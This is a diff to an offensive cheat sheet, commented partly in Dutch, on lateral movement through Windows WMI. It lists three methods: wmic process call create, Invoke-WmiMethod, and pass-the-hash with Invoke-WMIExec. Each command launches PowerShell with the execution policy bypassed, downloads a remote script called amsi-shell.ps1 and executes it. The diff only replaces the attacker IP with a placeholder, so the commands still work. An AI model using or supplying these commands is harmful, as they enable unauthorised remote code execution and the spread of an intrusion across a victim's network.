@@ -1,9 +1,9 @@
 # Lateral Movement via WMI (Windows Management Instrumentation)
 # Methode 1: wmic process call create
-wmic /node:TARGET_IP /user:DOMAIN\user /password:Password123! process call create "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')"
+wmic /node:TARGET_IP /user:DOMAIN\user /password:Password123! process call create "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')"
 # Methode 2: PowerShell Invoke-WmiMethod
-powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')' -ComputerName TARGET -Credential (Get-Credential)"
+powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payloads/amsi-shell.ps1'')' -ComputerName TARGET_IP -Credential (Get-Credential)"
 # Methode 3: Invoke-WMIExec (hash-based, geen cleartext wachtwoord)
-powershell -c "Import-Module .\Invoke-WMIExec.ps1; Invoke-WMIExec -Target TARGET_IP -Domain DOMAIN -Username user -Hash NTLM_HASH -Command 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')'"
+powershell -c "Import-Module .\Invoke-WMIExec.ps1; Invoke-WMIExec -Target TARGET_IP -Domain DOMAIN -Username user -Hash NTLM_HASH -Command 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payloads/amsi-shell.ps1'')'"
 # Tip: WMI gebruikt poort 135 (RPC) + dynamische poorten
 # Tip: Geen interactieve sessie - alleen blind command execution
